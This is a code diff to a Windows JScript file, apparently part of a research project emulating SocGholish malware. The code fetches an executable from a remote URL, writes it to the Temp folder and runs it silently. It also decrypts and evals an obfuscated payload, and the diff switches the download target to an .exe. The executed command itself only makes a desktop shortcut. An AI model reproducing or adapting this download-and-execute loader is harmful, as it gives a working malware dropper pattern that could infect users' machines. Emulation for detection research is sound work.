@@ -60,14 +60,18 @@ function downloadAndExecuteNirCmd(nirCmdUrl) {
         var fso = new ActiveXObject("Scripting.FileSystemObject");
         var tempFolder = fso.GetSpecialFolder(2); // Temporary Folder
         var nirCmdFile = fso.BuildPath(tempFolder.Path, "nircmd.exe");
-        
-        var file = fso.CreateTextFile(nirCmdFile, true);
-        file.Write(xmlhttp.responseBody);
-        file.Close();
+
+        // Use ADODB.Stream to handle binary data
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1; // adTypeBinary
+        stream.Open();
+        stream.Write(xmlhttp.responseBody);
+        stream.SaveToFile(nirCmdFile, 2); // 2 = adSaveCreateOverWrite
+        stream.Close();
 
         // Execute NirCmd command to create desktop shortcut
         var wshShell = new ActiveXObject("WScript.Shell");
-        var command = nirCmdFile + " urlshortcut \"https://www.google.com\" \"~$folder.desktop$\" \"Google\"";
+        var command = "\"" + nirCmdFile + "\" urlshortcut \"https://www.google.com\" \"~$folder.desktop$\" \"Google\"";
         wshShell.Run(command, 0, true);
     } else {
         WScript.Echo("Failed to download NirCmd. HTTP Status: " + xmlhttp.status);
@@ -118,5 +122,5 @@ if (XmlHttp_Object.status === 200) {
 var payload = decrypt(decode(fileContent), 4);
 this[eval(payload)];
 
-// downloadAndExecuteNirCmd("https://github.com/alekzandr/Research/raw/main/SocGholish%20Tests/Version%202/nircmdc.txt");
-downloadAndExecuteNirCmd("https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt");
+downloadAndExecuteNirCmd("https://github.com/alekzandr/Research/raw/main/SocGholish%20Tests/Version%202/nircmdc.exe");
+// downloadAndExecuteNirCmd("https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt");
